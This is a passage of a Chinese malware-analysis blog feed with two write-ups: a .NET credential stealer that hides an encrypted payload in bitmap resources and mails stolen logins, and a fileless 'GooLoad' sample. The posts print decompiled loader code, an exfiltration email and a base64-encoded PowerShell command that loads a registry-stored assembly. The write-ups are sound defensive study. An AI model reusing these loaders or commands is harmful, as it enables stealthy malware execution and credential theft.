Marshal.SizeOf(typeof(UnsafeNativeMethods.ThemingScope.ACTCTX));                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpSource = dllPath;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpResourceName = (IntPtr)nativeResourceManifestID;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.dwFlags = 8U;                        UnsafeNativeMethods.ThemingScope.hActCtx = UnsafeNativeMethods.ThemingScope.CreateActCtx(ref UnsafeNativeMethods.ThemingScope.enableThemingActivationContext); // CreateActCtx函数创建一个激活上下文                        UnsafeNativeMethods.ThemingScope.contextCreationSucceeded = (UnsafeNativeMethods.ThemingScope.hActCtx != new IntPtr(-1));                    }                    result = UnsafeNativeMethods.ThemingScope.contextCreationSucceeded;                }                return result;}</code></pre><p>看完完全不知道真正的东西，返回到入口点查看new From1。发现只是实例化各种窗口的，完全没有有用信息<br><img src="https://z3.ax1x.com/2021/04/14/cyHw4I.png" alt=""></p><p>在一筹莫展的时候，跟着视频走。发现是直接分析资源文件处理函数<br><img src="https://z3.ax1x.com/2021/04/14/cyHD8P.png" alt=""></p><p>跟随到资源文件，可以看到定义的SAS变量<br><img src="https://z3.ax1x.com/2021/04/14/cyHsv8.png" alt=""></p><p>跟随Rate函数（以后找不到函数被使用，可以直接Dnspy对着哪一行右键”分析”）<br><img src="https://z3.ax1x.com/2021/04/14/cyHcDg.png" alt=""></p><p>分析如下：</p><pre><code class="C#">using System;namespace WinFormsFirstOne{    // Token: 0x02000009 RID: 9    internal class Castle    {        // Token: 0x04000032 RID: 50        public static string Ir = &quot;cnJCh&quot;;        // Token: 0x04000033 RID: 51        public static string Iq = &quot;HvXUw&quot;;        // Token: 0x04000034 RID: 52        public static string Le = &quot;Load&quot;;    }}        InvokeMethod = 256,    public static string Select(string s)        {            char[] array = s.ToCharArray();            Array.Reverse(array); //反转数组            return new string(array);        }        // Token: 0x0600006C RID: 108 RVA: 0x00004BD0 File Offset: 0x00002DD0        public string Rate(object[] io)        {            byte[] array = Convert.FromBase64String(FarmDestination.Select(Resources.SAS.Replace(&quot;Quotes_on_Life&quot;, &quot;A&quot;))); //base64解码            Assembly assembly = (Assembly)Type.GetType(&quot;System@@@@@^Reflection@@@@@^Assembly&quot;.Replace(&quot;@@@@@^&quot;, &quot;.&quot;)).InvokeMember(Castle.Le, BindingFlags.InvokeMethod, null, null, new object[]            {                array            }); //调用公开静态函数(加载解码的base64) Assembly assembly = (Assembly)Type.GetType(&quot;System.Reflection.Assembly&quot;).InvokeMember(&quot;Load&quot;,256,null,null,new object[]){array}            MethodInfo o = (MethodInfo)LateBinding.LateGet(assembly.GetType(&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;), null, &quot;GetMethod&quot;, new object[]            {                &quot;执ZciGڤjPز&quot;            }, null, null); //获取&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;.执ZciGڤjP调用结果            LateBinding.LateGet(o, null, FarmDestination.Select(&quot;ekovnI&quot;), new object[]            {                null,                io            }, null, null);            return &quot;Biara&quot;;        }    }}</code></pre><p>将SAS变量进行base64解码<br>1.将Quotes_on_Life替换为A<br>2.反转base64<br>3.base64解码</p><p><img src="https://z3.ax1x.com/2021/04/14/cyHREj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cyHWUs.png" alt=""></p><p>保存到文件，继续拖到dnspy分析，跟踪调用的 执ZciGڤjPز函数。发现是调用了几个函数后远程加载<br><img src="https://z3.ax1x.com/2021/04/14/cyHf5n.png" alt=""></p><p>跟踪هmyڕDئفTH函数<br>1.获取入口函数程序集所在的文件<br>2.创建一个新的ResourceManager<br>3.返回了个Bitmap<br><img src="https://z3.ax1x.com/2021/04/14/cyH4Cq.png" alt=""></p><p>跟踪بظxئ家g希顾太太Bحه函数<br>（貌似是解密的算法）<br><img src="https://z3.ax1x.com/2021/04/14/cyH580.png" alt=""></p><p>跟踪c商ەڤG首首rءsە函数<br>从gzip流读取数据返回<br><img src="https://z3.ax1x.com/2021/04/14/cyHI2V.png" alt=""></p><p>一般这种情况需要断点Assembly.Load才能获取解密后的结果。然后作者把这个dump出来的文件，直接丢de4dot.exe然后就得到了解密的结果<br><img src="https://z3.ax1x.com/2021/04/14/cyHovT.png" alt=""></p><p>最后确定入口点在（smethod_4函数）：<br><img src="https://z3.ax1x.com/2021/04/14/cyH7KU.png" alt=""></p><pre><code class="C#">using System;using System.Collections.Generic;using System.Drawing;using System.IO;using System.IO.Compression;using System.Reflection;using System.Resources;using System.Text;using System.Threading;namespace ns1{    // Token: 0x02000002 RID: 2    public class GClass0    {        // Token: 0x06000001 RID: 1 RVA: 0x00002064 File Offset: 0x00000264        public static byte[] smethod_0(byte[] byte_0)        {            byte[] result;            using (MemoryStream memoryStream = new MemoryStream(byte_0))            {                byte[] array = new byte[4];                memoryStream.Read(array, 0, 4);                int num = BitConverter.ToInt32(array, 0);                using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))                {                    byte[] array2 = new byte[num];                    gzipStream.Read(array2, 0, num);                    result = array2;                }            }            return result;        }        // Token: 0x06000002 RID: 2 RVA: 0x000020E4 File Offset: 0x000002E4        public static byte[] smethod_1(byte[] byte_0, string string_1) //xor解密        {            byte[] bytes = Encoding.ASCII.GetBytes(string_1); //密钥            int num = (int)(byte_0[byte_0.Length - 1] ^ 112);            byte[] array = new byte[byte_0.Length + 1];            int num2 = 0;            for (int i = 0; i &lt;= byte_0.Length - 1; i++)            {                array[i] = (byte)((int)byte_0[i] ^ num ^ (int)bytes[num2]);                if (num2 == string_1.Length - 1)                {                    num2 = 0;                }                else                {                    num2++;                }            }            Array.Resize&lt;byte&gt;(ref array, byte_0.Length - 1);            return array;        }        // Token: 0x06000003 RID: 3 RVA: 0x00002164 File Offset: 0x00000364        private static byte[] smethod_2(Bitmap bitmap_0)        {            List&lt;byte&gt; list = new List&lt;byte&gt;();            checked            {                int num = bitmap_0.Width - 1;                for (int i = 0; i &lt;= num; i++)                {                    int num2 = bitmap_0.Height - 1;                    for (int j = 0; j &lt;= num2; j++)                    {                        Color pixel = bitmap_0.GetPixel(i, j);                        if (pixel != Color.FromArgb(0, 0, 0, 0))                        {                            list.InsertRange(list.Count, new byte[]                            {                                pixel.R,                                pixel.G,                                pixel.B                            });                        }                    }                }                return list.ToArray();            }        }        // Token: 0x06000004 RID: 4 RVA: 0x00002208 File Offset: 0x00000408        public static Bitmap smethod_3(string string_1, string string_2)        {            ResourceManager resourceManager = new ResourceManager(string_2 + &quot;.Properties.Resources&quot;, Assembly.GetEntryAssembly());            return (Bitmap)resourceManager.GetObject(string_1);        }        // Token: 0x06000005 RID: 5 RVA: 0x0000223C File Offset: 0x0000043C        public static void smethod_4(string string_1, string string_2, string string_3)        {            Thread.Sleep(38000);            byte[] rawAssembly = GClass0.smethod_0(GClass0.smethod_1(GClass0.smethod_2(GClass0.smethod_3(string_1, string_3)), string_2));            Assembly.Load(rawAssembly).EntryPoint.Invoke(0, null);            Environment.Exit(0);        }        // Token: 0x04000001 RID: 1        private string string_0 = &quot;You will face many defeats in life, but never let yourself be defeated.&quot;;    }}</code></pre><p>由于加密太多，过于繁琐。无法看到源代码静态分析执行了什么。只能丢沙箱了看看执行了什么，或者在运行的时候dump .NET内存<br>（最后是释放了个exe在执行）<br>作者使用了MegaDumper工具在运行的时候dump下来的exe：<a href="https://github.com/CodeCracker-Tools/MegaDumper" target="_blank" rel="noopener">https://github.com/CodeCracker-Tools/MegaDumper</a><br><img src="https://z3.ax1x.com/2021/04/14/cybCrD.png" alt=""></p><p>最后丢dnspy得到原始的代码</p><pre><code class="C#">using System;using System.EnterpriseServices;using System.Globalization;using System.IO;using System.Reflection;using System.Runtime.InteropServices;using System.Runtime.Remoting;using System.Text;using System.Threading;// Token: 0x02000003 RID: 3[ComVisible(false)]public class RegSvcs{    // Token: 0x06000005 RID: 5    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]    private static extern int SearchPath(string path, string fileName, string extension, int numBufferChars, StringBuilder buffer, int[] filePart);    // Token: 0x06000007 RID: 7 RVA: 0x0000209C File Offset: 0x0000029C    private static RegistrationHelper GetRegistrationHelper(bool bCreateAppDomain, out AppDomain domain)    {        RegistrationHelper result = null;        domain = null;        if (!bCreateAppDomain)        {            result = new RegistrationHelper();        }        else        {            string directoryName = Path.GetDirectoryName(RegSvcs.regConfig.AssemblyFile);            domain = AppDomain.CreateDomain(&quot;RegSvcs&quot;, null, new AppDomainSetup            {                ApplicationBase = directoryName            });            if (domain != null)            {                ObjectHandle objectHandle = domain.CreateInstance(typeof(RegistrationHelper).Assembly.FullName, typeof(RegistrationHelper).FullName);                if (objectHandle != null)                {                    result = (RegistrationHelper)objectHandle.Unwrap();                }            }        }        return result;    }    // Token: 0x06000008 RID: 8 RVA: 0x00002124 File Offset: 0x00000324    private static string FindAssembly(string name)    {        StringBuilder stringBuilder = new StringBuilder(261);        if (RegSvcs.SearchPath(null, name, null, stringBuilder.Capacity + 1, stringBuilder, null) == 0)        {            return null;        }        return stringBuilder.ToString();    }    // Token: 0x06000009 RID: 9 RVA: 0x00002158 File Offset: 0x00000358    private static bool IsAssemblyInGAC(string name)    {        try        {            Assembly assembly = Assembly.Load(name);        }        catch        {            return false;        }        return true;    }    // Token: 0x0600000A RID: 10 RVA: 0x00002188 File Offset: 0x00000388    [MTAThread]    public static int Main(string[] args)    {        int result;        try        {            result = RegSvcs.UnsafeMain(args);        }        catch        {            result = 1;        }        return result;    }    // Token: 0x0600000B RID: 11 RVA: 0x000021B4 File Offset: 0x000003B4    public static int UnsafeMain(string[] args)    {        AppDomain appDomain = null;        RegSvcs.DoConsoleInitialization();        try        {            RegSvcs.ParseArguments(args); //根据命令行做出对应的函数处理            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            if (RegSvcs.regConfig.AssemblyFile != null)            {                string text = RegSvcs.FindAssembly(RegSvcs.regConfig.AssemblyFile);                RegistrationHelper registrationHelper;                if (text != null)                {                    RegSvcs.regConfig.AssemblyFile = text;                    registrationHelper = RegSvcs.GetRegistrationHelper(true, out appDomain);                }                else                {                    if (!RegSvcs.IsAssemblyInGAC(RegSvcs.regConfig.AssemblyFile))                    {                        throw new RegistrationException(Resource.FormatString(&quot;RegSvcs_AssemblyNotFound&quot;, RegSvcs.regConfig.AssemblyFile));                    }                    registrationHelper = RegSvcs.GetRegistrationHelper(false, out appDomain);                }                if (RegSvcs.uninstallApplication)                {                    registrationHelper.UninstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_UninstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile));                    }                }                else                {                    registrationHelper.InstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        if (RegSvcs.regConfig.Partition != null &amp;&amp; RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess2&quot;, new string[]                            {                                RegSvcs.regConfig.AssemblyFile,                                RegSvcs.regConfig.Application,                                RegSvcs.regConfig.Partition,                                RegSvcs.regConfig.TypeLibrary                            }));                        }                        else if (RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile, RegSvcs.regConfig.Application, RegSvcs.regConfig.TypeLibrary));                        }                        else                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_NoServicedComponents&quot;));                        }                    }                }            }        }        catch (UsageException ex)        {            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            Console.WriteLine(ex.Message);            return ex.ReturnCode;        }        catch (RegistrationException ex2)        {            string msg;            if (RegSvcs.uninstallApplication)            {                msg = Resource.FormatString(&quot;RegSvcs_UninstallError&quot;);            }            else            {                msg = Resource.FormatString(&quot;RegSvcs_InstallError&quot;);            }            RegSvcs.DumpExceptions(msg, ex2, false);            if (ex2.InnerException != null)            {                if (ex2.InnerException is COMException)                {                    COMException ex3 = (COMException)ex2.InnerException;                    if (ex3.ErrorCode != 0)                    {                        return ex3.ErrorCode;                    }                    return 1;                }            }            else if (ex2.ErrorInfo != null)            {                foreach (RegistrationErrorInfo registrationErrorInfo in ex2.ErrorInfo)                {                    if (registrationErrorInfo.ErrorCode != 0)                    {                        return registrationErrorInfo.ErrorCode;                    }                }            }            return 1;        }        catch (COMException ex4)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_CatalogError&quot;), ex4, false);            if (ex4.ErrorCode != 0)            {                return ex4.ErrorCode;            }            return 1;        }        catch (Exception e)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_UnknownError&quot;), e, true);            return 1;        }        finally        {            if (appDomain != null)            {                AppDomain.Unload(appDomain);            }        }        return 0;    }    // Token: 0x0600000C RID: 12 RVA: 0x000024FC File Offset: 0x000006FC    private static void DoConsoleInitialization()    {        Thread.CurrentThread.CurrentUICulture = CultureInfo.CurrentUICulture.GetConsoleFallbackUICulture(); //当默认的图形用户界面区域不合适时，获取适合控制台应用程序的备用用户界面区域        if (Console.OutputEncoding.CodePage != 65001 &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.OEMCodePage &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.ANSICodePage) //控制台编码不为UTF-8当前线程页面代码不为xxx则设置        {            Thread.CurrentThread.CurrentUICulture = new CultureInfo(&quot;en-US&quot;); //设置区域为en-us        }    }    // Token: 0x0600000D RID: 13 RVA: 0x00002584 File Offset: 0x00000784    private static void DumpExceptions(string msg, Exception e, bool ename)    {        Console.WriteLine(&quot;\n&quot; + msg);        int num = 1;        while (e != null)        {            if (ename || e.Message == null || e.Message.Length == 0)            {                Console.WriteLine(string.Concat(new object[]                {                    num,                    &quot;: &quot;,                    e.GetType().FullName,                    &quot; - &quot;,                    e.Message                }));            }            else            {                Console.WriteLine(num + &quot;: &quot; + e.Message);            }            if (e is RegistrationException)            {                RegistrationErrorInfo[] errorInfo = ((RegistrationException)e).ErrorInfo;                if (errorInfo != null)                {                    foreach (RegistrationErrorInfo registrationErrorInfo in errorInfo)                    {                        if (registrationErrorInfo.MinorRef.ToLower(CultureInfo.InvariantCulture) != &quot;&lt;invalid&gt;&quot;)                        {                            Console.WriteLine(string.Concat(new string[]                            {                                &quot;    &quot;,                                registrationErrorInfo.Name,                                &quot;.&quot;,                                registrationErrorInfo.MinorRef,                                &quot;: &quot;,                                registrationErrorInfo.ErrorString                            }));                        }                        else                        {                            Console.WriteLine(&quot;    &quot; + registrationErrorInfo.Name + &quot;: &quot; + registrationErrorInfo.ErrorString);                        }                    }                }            }            num++;            e = e.InnerException;        }    }    // Token: 0x0600000E RID: 14 RVA: 0x000026EE File Offset: 0x000008EE    private static void PrintLogo()    {        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_CopyrightMsg&quot;, &quot;4.7.3062.0&quot;, CommonResStrings.CopyrightForCmdLine));    }    // Token: 0x0600000F RID: 15 RVA: 0x0000270C File Offset: 0x0000090C    private static bool IsArgument(string arg, string check)    {        string b = arg.ToLower(CultureInfo.InvariantCulture);        return &quot;/&quot; + check == b || &quot;-&quot; + check == b;    }    // Token: 0x06000010 RID: 16 RVA: 0x0000274C File Offset: 0x0000094C    private static bool IsPrefixArgument(string arg, string check, ref string prefix)    {        string text = arg.ToLower(CultureInfo.InvariantCulture);        prefix = null;        if (arg.StartsWith(&quot;/&quot; + check + &quot;:&quot;, StringComparison.Ordinal) || arg.StartsWith(&quot;-&quot; + check + &quot;:&quot;, StringComparison.Ordinal))        {            if (arg.Length &gt; check.Length + 2)            {                prefix = arg.Substring(check.Length + 2);            }            return true;        }        return RegSvcs.IsArgument(arg, check);    }    // Token: 0x06000011 RID: 17 RVA: 0x000027C4 File Offset: 0x000009C4    private static void ParseArguments(string[] args) //根据命令行参数做出对应的函数处理    {        RegSvcs.regConfig.InstallationFlags = (InstallationFlags.FindOrCreateTargetApplication | InstallationFlags.ReconfigureExistingApplication | InstallationFlags.ReportWarningsToConsole);        RegSvcs.logoOutput = true;        RegSvcs.successOutput = true;        RegSvcs.uninstallApplication = false;        if (args.Length &lt; 1)        {            throw new UsageException(0);        }        int i;        for (i = 0; i &lt; args.Length; i++)        {            string text = null;            if (RegSvcs.IsArgument(args[i], &quot;?&quot;) || RegSvcs.IsArgument(args[i], &quot;help&quot;))            {                throw new UsageException(0);            }            if (RegSvcs.IsArgument(args[i], &quot;c&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.CreateTargetApplication;                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;fc&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;exapp&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~(InstallationFlags.CreateTargetApplication | InstallationFlags.FindOrCreateTargetApplication);            }            else if (RegSvcs.IsArgument(args[i], &quot;extlb&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ExpectExistingTypeLib;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;tlb&quot;, ref text))            {                RegSvcs.regConfig.TypeLibrary = text;            }            else if (RegSvcs.IsArgument(args[i], &quot;reconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;noreconfig&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReconfigureExistingApplication;            }            else if (RegSvcs.IsArgument(args[i], &quot;nologo&quot;))            {                RegSvcs.logoOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;quiet&quot;))            {                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.ReportWarningsToConsole;                RegSvcs.logoOutput = false;                RegSvcs.successOutput = false;            }            else if (RegSvcs.IsArgument(args[i], &quot;u&quot;))            {                RegSvcs.uninstallApplication = true;            }            else if (RegSvcs.IsArgument(args[i], &quot;componly&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.ConfigureComponentsOnly;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appname&quot;, ref text))            {                RegSvcs.regConfig.Application = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;parname&quot;, ref text))            {                RegSvcs.regConfig.Partition = text;            }            else if (RegSvcs.IsPrefixArgument(args[i], &quot;appdir&quot;, ref text))            {                RegSvcs.regConfig.ApplicationRootDirectory = text;            }            else            {                if (args[i].StartsWith(&quot;/&quot;, StringComparison.Ordinal) || args[i].StartsWith(&quot;-&quot;, StringComparison.Ordinal))                {                    throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_InvalidOption&quot;, args[i]));                }                break;            }        }        if (i &gt; args.Length)        {            throw new UsageException(1);        }        int num = args.Length - i;        if (num == 0)        {            throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_NotEnoughArgs&quot;));        }        if (num == 1)        {            RegSvcs.regConfig.AssemblyFile = args[i];            return;        }        if (num == 2)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = null;            return;        }        if (num == 3)        {            RegSvcs.regConfig.AssemblyFile = args[i];            RegSvcs.regConfig.Application = args[i + 1];            RegSvcs.regConfig.TypeLibrary = args[i + 2];            return;        }        throw new UsageException(1, Resource.FormatString(&quot;RegSvcs_ToManyArgs&quot;));    }    // Token: 0x04000002 RID: 2    private const int MAX_PATH = 260;    // Token: 0x04000003 RID: 3    private static RegistrationConfig regConfig = new RegistrationConfig();    // Token: 0x04000004 RID: 4    private static bool logoOutput;    // Token: 0x04000005 RID: 5    private static bool successOutput;    // Token: 0x04000006 RID: 6    private static bool uninstallApplication;}</code></pre><p>看了一下连接信息：<br>先发送了一个Auth的请求头进行验证</p><pre><code>解码:info@stankovic.hr</code></pre><p><img src="https://z3.ax1x.com/2021/04/14/cybeRP.png" alt=""></p><p>验证成功后会收集本机信息进行上传(发送到邮箱)<br><img src="https://z3.ax1x.com/2021/04/14/cybUMT.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cybBdJ.png" alt=""></p><pre><code>MIME-Version: 1.0From: info@stankovic.hrTo: info@stankovic.hrDate: 28 Jul 2020 20:46:04 +0100Subject: PW_admin/USER-PCContent-Type: text/html; charset=us-asciiContent-Transfer-Encoding: quoted-printableTime: 07/28/2020 20:45:57User Name: adminComputer Name: U=SER-PCOSFullName: Microsoft Windows 7 ProfessionalCPU: I=ntel(R) Core(TM) i5-6400 CPU @ 2.70GHzRAM: 3583.61 MB&lt;hr&gt;=URL:192.168.1.10D=0AUsername:honey@pot.com0D=0APassword=:honeypass3560D=0AApplication:Outlook0D=0A&lt;hr&gt;=0D=0AURL=:https://m.facebook.com/0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Chrome0D=0A&lt;hr&gt;=0D=0A=URL:https://m.facebook.com0D=0AUsername:honey@pot.com0D=0A=Password:honeypass3560D=0AApplication:Firefox0D=0A&lt;hr&gt;=0D=0A</code></pre><p>还有一些功能需要详细分析，感觉需要HOOK才能更好的分析….</p><p>MD5:1A25E75693B99AD09E55AEA29C6F2775<br>IOC:<br>89.201.175.36</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;继续学习样本分析&lt;br&gt;原YouTube视频分析：&lt;a href=&quot;https://www.youtube.com/watch?v=deG_-5opR30&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.youtube.com/wat</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>无文件GooLoad静态分析</title>
    <link href="http://422926799.github.io/posts/9d2ce0c6.html"/>
    <id>http://422926799.github.io/posts/9d2ce0c6.html</id>
    <published>2021-04-12T09:33:30.000Z</published>
    <updated>2021-04-12T11:51:24.291Z</updated>
    
    <content type="html"><![CDATA[<p>Youtube分析视频:<a href="https://www.youtube.com/watch?v=BcFbkjUVc7o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=BcFbkjUVc7o</a><br>样本下载地址:<a href="https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3" target="_blank" rel="noopener">https://bazaar.abuse.ch/sample/6bb71d8bf32cceef6a431136e0c965aa905c45c240b40bb20aa6fb6f661300f3</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>md5:1766EFD0E682B405C2A49613DD1B4D81<br>sha1:6A8644B0A41B471D21476FDE2D2C07599943BF55<br>sha256:8D39AA47F437C37451A7D249E5EEE77D1BE6C00C95FAD82D69C119A734F5F4B3</p><p>拿到的是个js，启动用wscript启动。js内容如下<br><img src="https://z3.ax1x.com/2021/04/12/cDuuJx.png" alt=""></p><p>丢到<code>https://lelinhtinh.github.io/de4js/</code>美化一下代码<br><img src="https://z3.ax1x.com/2021/04/12/cDuqt1.png" alt=""></p><p>执行流程如下:<br>1.首先是获取当前用户名称，创建了一个注册表路径:<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;</code><br>2.读取ocwbowtyl变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>3.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>4.创建注册表路径<code>HKEY_CURRENT_USER\SOFTWARE\&lt;%USERNAME%1&gt;</code><br>5.gzmttsouj赋值znahht<br>6.读取gzmttsouj变量的值长度到4000的时候写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt;</code><br>7.写入<code>HKEY_CURRENT_USER\SOFTWARE\&lt;USERNAME&gt;\&lt;ltrjrmhvifoz&gt; value:&lt;gzmttsouj&gt; type:REG_SZ</code><br>8.判断文件夹(<code>C:\Program Files (x86)</code>)是否存在，决定采用那个powershell执行<br>9.执行powershell command</p><p><img src="https://z3.ax1x.com/2021/04/12/cDKHKS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/12/cDKxCq.png" alt=""></p><p>执行的powershell command<br><img src="https://z3.ax1x.com/2021/04/12/cDMTiR.png" alt=""></p><p>解码如下<br><img src="https://z3.ax1x.com/2021/04/12/cDQRfI.png" alt=""></p><pre><code class="powershell">#cmd /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -En &quot;PAAjACAAdQB2AHgAdgByAGwAIAAjAD4AJAB1AD0AJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAA3ADAAMAA7ACQAaQArACsAKQB7ACQAYwA9ACIASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAIgArACQAdQArACIAMQAiADsAVAByAHkAewAkAGEAPQAkAGEAKwAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAHAAYQB0AGgAIAAkAGMAKQAuACQAaQB9AEMAYQB0AGMAaAB7AH0AfQA7AGYAdQBuAGMAdABpAG8AbgAgAGMAaABiAGEAewBbAGMAbQBkAGwAZQB0AGIAaQBuAGQAaQBuAGcAKAApAF0AcABhAHIAYQBtACgAWwBwAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACkAXQBbAFMAdAByAGkAbgBnAF0AJABoAHMAKQA7ACQAQgB5AHQAZQBzACAAPQAgAFsAYgB5AHQAZQBbAF0AXQA6ADoAbgBlAHcAKAAkAGgAcwAuAEwAZQBuAGcAdABoACAALwAgADIAKQA7AGYAbwByACgAJABpAD0AMAA7ACAAJABpACAALQBsAHQAIAAkAGgAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwA9ADIAKQB7ACQAQgB5AHQAZQBzAFsAJABpAC8AMgBdACAAPQAgAFsAYwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgB5AHQAZQAoACQAaABzAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAkAGkALAAgADIAKQAsACAAMQA2ACkAfQAkAEIAeQB0AGUAcwB9ADsAJABpACAAPQAgADAAOwBXAGgAaQBsAGUAIAAoACQAVAByAHUAZQApAHsAJABpACsAKwA7ACQAawBvACAAPQAgAFsAbQBhAHQAaABdADoAOgBTAHEAcgB0ACgAJABpACkAOwBpAGYAIAAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewAgAGIAcgBlAGEAawB9AH0AWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIABjAGgAYgBhACgAJABhAC4AcgBlAHAAbABhAGMAZQAoACIAIwAiACwAJABrAG8AKQApADsAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AFsATQBvAGQAZQBdADoAOgBTAGUAdAB1AHAAKAApADsA &quot; &lt; # uvxvrl # &gt;$u = $env:UserName;for ($i = 0;$i  - le 700;$i++) {    $c = &quot;HKCU:\SOFTWARE\&quot;+$u+&quot;1&quot;;    Try{        $a=$a+(Get-ItemProperty -path $c).$i #获取KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值    }Catch{    }};function chba{    #转换为二进制数据    [cmdletbinding()]param([parameter(Mandatory=$true)][String]$hs);    $Bytes = [byte[]]::new($hs.Length / 2);    for($i=0; $i -lt $hs.Length; $i+=2){        $Bytes[$i/2] = [convert]::ToByte($hs.Substring($i, 2), 16)    }    $Bytes};$i = 0;While ($True){    $i++;    $ko = [math]::Sqrt($i);    if ($ko -eq 1000){         break    }}[byte[]]$b = chba($a.replace(&quot;#&quot;, $ko)); #将&quot;#&quot;替换为1000 1000对应十六进制为NULL[Reflection.Assembly]::Load($b); #远程加载[Mode]::Setup();</code></pre><p>powershell执行流程:<br>1.获取<code>KCU:\SOFTWARE\&lt;USERNAME&gt;1的所有的键值</code><br>2.获取到内容将#替换为1000<br>3.远程加载执行<br>4.调用远程加载里的<code>setup</code>函数</p><p>提取znahht变量的内容，将#替换为1000.十六进制解码，丢进dnSpy分析</p><p>md5:404280229BFDBE01D751BCE03210F75E<br>sha1:098B332B7A4F8712916D6A681799E390DAAAEF98<br>sha256:BFFA7EC58ABF9F4AB9940C1633EF86484DFC1425326EC247699BBB2D1C6E45A9</p><p>得到的结果如下</p><pre><code class="csharp">// Mode// Token: 0x06000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304public static string Setup(){    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\&quot; + Environment.UserName); //读取HKCU\SOFTWARE\&lt;USERNAME&gt;    if (registryKey != null)    {        string text = &quot;&quot;;        for (int i = 0; i &lt; 99999; i++)        {            string text2 = &quot;&quot;;            try            {                text2 = registryKey.GetValue(i.ToString()).ToString(); //读取从0到99999键名的键值            }            catch            {            }            if (text2.Length == 0)            {                break;            }            text += text2;        }        registryKey.Close(); //关闭注册表        text = text.Replace(&quot;q&quot;, &quot;000&quot;).Replace(&quot;v&quot;, 